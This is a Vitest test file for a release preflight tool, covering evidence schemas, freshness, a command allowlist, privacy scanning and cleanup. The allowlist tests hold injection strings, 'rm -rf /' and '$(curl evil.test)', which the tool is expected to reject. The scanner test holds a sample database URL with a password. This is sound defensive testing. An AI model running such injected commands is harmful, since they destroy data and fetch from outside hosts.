// @vitest-environment node
import { mkdir, mkdtemp, readFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';

import { afterEach, describe, expect, it } from 'vitest';

import { assessEvidenceFreshness } from './freshness';
import {
  buildDefaultReleasePlan,
  cleanupToolOwnedPath,
  dispatchAllowlistedCommand,
  evaluateProductionReadiness,
  isProductionPassed,
  isToolOwnedTempPath,
  productionReadinessReportSchema,
  resolveAllowlistedArgv,
  runProductionPreflight,
  scanForForbiddenReportContent,
  writeJsonAtomic,
} from './index';
import { evidenceEnvelopeSchema, releasePlanSchema } from './schemas';
import {
  buildAppRollbackEvidence,
  buildCandidate,
  buildE2eEvidence,
  buildFailureDrillsEvidence,
  buildFullCiEvidence,
  buildFullProductionEvidence,
  buildMigrationEvidence,
  buildPathBoundariesEvidence,
  buildPlan,
  buildUpstreamEvidence,
  FIXTURE_CANDIDATE_SHA,
  OTHER_CANDIDATE_SHA,
} from './testFixtures';

const tempDirs: string[] = [];

afterEach(async () => {
  for (const dir of tempDirs.splice(0)) {
    await rm(dir, { force: true, recursive: true });
  }
});

const makeTempDir = async (): Promise<string> => {
  const dir = await mkdtemp(path.join(tmpdir(), 'm15q06-test-'));
  tempDirs.push(dir);
  return dir;
};

describe('production preflight schemas and evaluation', () => {
  it('happy path: full ci evidence evaluates to unverified (never false production pass)', () => {
    const { exitCode, report } = evaluateProductionReadiness({
      candidate: buildCandidate(),
      evidence: buildFullCiEvidence(),
      mode: 'preflight',
      plan: buildPlan(),
    });

    expect(report.overall).toBe('unverified');
    expect(report.classification).toBe('local-harness');
    expect(report.checks.every((check) => check.result === 'passed')).toBe(true);
    expect(isProductionPassed(report)).toBe(false);
    expect(exitCode).toBe(1);
    expect(productionReadinessReportSchema.safeParse(report).success).toBe(true);
  });

  it('production-authorized all-pass evidence yields overall passed', () => {
    const { exitCode, report } = evaluateProductionReadiness({
      candidate: buildCandidate(),
      evidence: buildFullProductionEvidence(),
      mode: 'production-authorized',
      plan: buildPlan(),
    });

    expect(report.overall).toBe('passed');
    expect(report.classification).toBe('production-authorized');
    expect(isProductionPassed(report)).toBe(true);
    expect(exitCode).toBe(0);
  });

  it('validate-harness never emits overall=passed and exits 0 for valid contract', () => {
    const { exitCode, report } = evaluateProductionReadiness({
      candidate: buildCandidate(),
      evidence: buildFullCiEvidence(),
      mode: 'validate-harness',
      plan: buildPlan(),
    });

    expect(report.overall).not.toBe('passed');
    expect(report.mode).toBe('validate-harness');
    expect(exitCode).toBe(0);
  });

  it('rejects dirty candidate', () => {
    expect(() =>
      evaluateProductionReadiness({
        candidate: { ...buildCandidate(), dirty: true as unknown as false },
        evidence: buildFullCiEvidence(),
        mode: 'preflight',
        plan: buildPlan(),
      }),
    ).toThrow();
  });

  it('fails closed on cross-candidate evidence mixing', () => {
    const evidence = buildFullCiEvidence();
    evidence[0] = buildPathBoundariesEvidence({ candidateSha: OTHER_CANDIDATE_SHA });

    const { report } = evaluateProductionReadiness({
      candidate: buildCandidate(),
      evidence,
      mode: 'preflight',
      plan: buildPlan(),
    });

    const pathCheck = report.checks.find((check) => check.gate === 'path-boundaries');
    expect(pathCheck?.result).toBe('failed');
    expect(report.overall).toBe('failed');
  });

  it('rejects stale evidence', () => {
    const stale = new Date(Date.now() - 10 * 24 * 60 * 60 * 1000).toISOString();
    const evidence = buildFullCiEvidence();
    evidence[2] = buildE2eEvidence({ freshness: { generatedAt: stale } });

    const { report } = evaluateProductionReadiness({
      candidate: buildCandidate(),
      evidence,
      freshness: { maxAgeMs: 72 * 60 * 60 * 1000 },
      mode: 'preflight',
      plan: buildPlan(),
    });

    expect(report.checks.find((check) => check.gate === 'enterprise-admin-e2e')?.result).toBe(
      'failed',
    );
    expect(report.overall).toBe('failed');
  });

  it('rejects future evidence beyond clock skew', () => {
    const future = new Date(Date.now() + 60 * 60 * 1000).toISOString();
    const evidence = buildFullCiEvidence();
    evidence[1] = buildMigrationEvidence({ freshness: { generatedAt: future } });

    const { report } = evaluateProductionReadiness({
      candidate: buildCandidate(),
      evidence,
      freshness: { clockSkewMs: 5 * 60 * 1000 },
      mode: 'preflight',
      plan: buildPlan(),
    });

    expect(report.checks.find((check) => check.gate === 'migration-compat')?.result).toBe('failed');
  });

  it('missing gates yield not-executed and unverified overall', () => {
    const { report } = evaluateProductionReadiness({
      candidate: buildCandidate(),
      evidence: [buildPathBoundariesEvidence()],
      mode: 'preflight',
      plan: buildPlan(),
    });

    const missing = report.checks.filter((check) => check.result === 'not-executed');
    expect(missing.length).toBeGreaterThan(0);
    expect(report.overall).toBe('unverified');
  });

  it('duplicate evidence gates fail closed', () => {
    expect(() =>
      evaluateProductionReadiness({
        candidate: buildCandidate(),
        evidence: [buildPathBoundariesEvidence(), buildPathBoundariesEvidence()],
        mode: 'preflight',
        plan: buildPlan(),
      }),
    ).toThrow(/Duplicate evidence/);
  });

  it('rejects skip-heavy e2e as passed', () => {
    const bad = buildE2eEvidence({
      assertions: { failed: 0, passed: 0, skipped: 5, total: 5 },
      status: 'passed',
    });
    expect(evidenceEnvelopeSchema.safeParse(bad).success).toBe(false);
  });

  it('rejects zero-assertion failure drills as passed', () => {
    const bad = buildFailureDrillsEvidence({
      assertions: { failed: 0, passed: 0, skipped: 0, total: 0 },
      status: 'passed',
    });
    expect(evidenceEnvelopeSchema.safeParse(bad).success).toBe(false);
  });

  it('rejects local-harness failure-drills claiming passed', () => {
    const bad = buildFailureDrillsEvidence({
      scope: 'local-harness',
      status: 'passed',
    });
    expect(evidenceEnvelopeSchema.safeParse(bad).success).toBe(false);
  });

  it('rejects journal-only migration (rerun skipped) as passed', () => {
    const bad = buildMigrationEvidence({
      rerunResult: 'skipped',
      status: 'passed',
    });
    expect(evidenceEnvelopeSchema.safeParse(bad).success).toBe(false);
  });

  it('rejects production migration pass without overall=passed dump path', () => {
    const bad = buildMigrationEvidence({
      overall: 'unverified',
      scope: 'production-authorized',
      status: 'passed',
    });
    expect(evidenceEnvelopeSchema.safeParse(bad).success).toBe(false);
  });

  it('rejects upstream report for another candidate short sha', () => {
    const bad = buildUpstreamEvidence({
      candidateShort: OTHER_CANDIDATE_SHA.slice(0, 12),
      status: 'passed',
    });
    expect(evidenceEnvelopeSchema.safeParse(bad).success).toBe(false);
  });

  it('rejects app-rollback passed without baselineExecutable', () => {
    const bad = buildAppRollbackEvidence({
      baselineExecutable: false,
      status: 'passed',
    });
    expect(evidenceEnvelopeSchema.safeParse(bad).success).toBe(false);
  });

  it('release plan rejects missing high-risk first-enable windows', () => {
    const plan = buildPlan();
    plan.windows[2]!.firstEnableCapability = 'none';
    expect(releasePlanSchema.safeParse(plan).success).toBe(false);
  });

  it('release plan rejects two high-risk first-enables in one window', () => {
    const plan = buildPlan();
    plan.windows[4]!.firstEnableCapability = 'branding-cutover';
    expect(releasePlanSchema.safeParse(plan).success).toBe(false);
  });

  it('unknown evidence fields fail strict schema', () => {
    const bad = { ...buildPathBoundariesEvidence(), extra: true };
    expect(evidenceEnvelopeSchema.safeParse(bad).success).toBe(false);
  });
});

describe('command allowlist and injection', () => {
  it('resolves only allowlisted command ids', () => {
    const argv = resolveAllowlistedArgv('preflight-validate');
    expect(argv[0]).toBe('bun');
    expect(argv).not.toContain(';');
  });

  it('rejects injection strings as command ids', async () => {
    await expect(
      dispatchAllowlistedCommand({
        commandId: 'preflight-validate; rm -rf /',
        confirmExecute: false,
        execute: false,
      }),
    ).rejects.toThrow();

    await expect(
      dispatchAllowlistedCommand({
        commandId: '$(curl evil.test)',
        confirmExecute: false,
        execute: false,
      }),
    ).rejects.toThrow();

    await expect(
      dispatchAllowlistedCommand({
        commandId: 'not-a-real-command',
        confirmExecute: false,
        execute: false,
      }),
    ).rejects.toThrow();
  });

  it('dry-run does not execute mutating commands without confirm', async () => {
    const result = await dispatchAllowlistedCommand({
      commandId: 'flag-enable-oidc',
      confirmExecute: false,
      execute: false,
    });
    expect(result.mode).toBe('dry-run');
    expect(result.exitCode).toBeNull();
  });

  it('mutating execute requires confirmExecute', async () => {
    await expect(
      dispatchAllowlistedCommand({
        commandId: 'flag-enable-oidc',
        confirmExecute: false,
        execute: true,
      }),
    ).rejects.toThrow(/confirmExecute/);
  });
});

describe('freshness', () => {
  it('accepts fresh evidence and rejects stale/future', () => {
    const now = Date.now();
    expect(
      assessEvidenceFreshness({ generatedAt: new Date(now).toISOString() }, { nowMs: now }).verdict,
    ).toBe('fresh');
    expect(
      assessEvidenceFreshness(
        { generatedAt: new Date(now - 100 * 60 * 60 * 1000).toISOString() },
        { maxAgeMs: 72 * 60 * 60 * 1000, nowMs: now },
      ).verdict,
    ).toBe('stale');
    expect(
      assessEvidenceFreshness(
        { generatedAt: new Date(now + 60 * 60 * 1000).toISOString() },
        { clockSkewMs: 60_000, nowMs: now },
      ).verdict,
    ).toBe('future');
  });
});

describe('privacy scanner', () => {
  it('flags connection strings, tokens, and forbidden keys', () => {
    expect(
      scanForForbiddenReportContent({
        connectionString: 'postgres://x',
      }).result,
    ).toBe('failed');
    expect(
      scanForForbiddenReportContent({
        note: 'postgres://admin:hunter2@db/internal',
      }).result,
    ).toBe('failed');
    expect(
      scanForForbiddenReportContent({
        gate: 'path-boundaries',
        violationCount: 0,
      }).result,
    ).toBe('passed');
  });
});

describe('atomic write and cleanup', () => {
  it('writes atomic json and cleans only tool-owned temp paths', async () => {
    const dir = await makeTempDir();
    const out = path.join(dir, 'report.json');
    const { sha256 } = await writeJsonAtomic(out, { ok: true });
    expect(sha256).toMatch(/^[a-f\d]{64}$/);
    const body = await readFile(out, 'utf8');
    expect(JSON.parse(body)).toEqual({ ok: true });

    const toolTemp = path.join(dir, 'm15q06-pr-aabbccddeeff0011');
    await mkdir(toolTemp, { recursive: true });
    expect(isToolOwnedTempPath(toolTemp)).toBe(true);
    expect(await cleanupToolOwnedPath(toolTemp)).toBe('passed');

    const foreign = path.join(dir, 'user-owned-dir');
    await mkdir(foreign, { recursive: true });
    expect(await cleanupToolOwnedPath(foreign)).toBe('skipped');
  });

  it('runProductionPreflight writes deterministic ordered checks', async () => {
    const dir = await makeTempDir();
    const out = path.join(dir, 'preflight-report.json');
    const result = await runProductionPreflight({
      candidate: buildCandidate(),
      evidence: buildFullCiEvidence(),
      mode: 'validate-harness',
      outputPath: out,
      plan: buildPlan(),
    });

    expect(result.exitCode).toBe(0);
    const raw = await readFile(out, 'utf8');
    const parsed = JSON.parse(raw) as { checks: Array<{ gate: string }> };
    const gates = parsed.checks.map((check) => check.gate);
    expect(gates).toEqual([
      'path-boundaries',
      'migration-compat',
      'enterprise-admin-e2e',
      'upstream-rebase',
      'failure-drills',
      'backup-restore',
      'app-rollback',
    ]);

    // Rerun is deterministic.
    const result2 = await runProductionPreflight({
      candidate: buildCandidate(),
      evidence: buildFullCiEvidence(),
      mode: 'validate-harness',
      outputPath: path.join(dir, 'preflight-report-2.json'),
      plan: buildPlan(),
    });
    expect(result2.report.checks.map((check) => check.gate)).toEqual(gates);
  });
});

describe('default release plan', () => {
  it('emits milestone A–F with separate high-risk first-enables', () => {
    const plan = buildDefaultReleasePlan({
      candidateGitSha: FIXTURE_CANDIDATE_SHA,
      releaseId: 'rc-demo',
    });
    expect(plan.windows).toHaveLength(6);
    const firstEnables = plan.windows
      .map((window) => window.firstEnableCapability)
      .filter((value) => value !== 'none');
    expect(new Set(firstEnables).size).toBe(4);
    expect(firstEnables).toEqual(
      expect.arrayContaining([
        'oidc',
        'connector-shared-credentials',
        'default-inbox',
        'branding-cutover',
      ]),
    );
  });
});
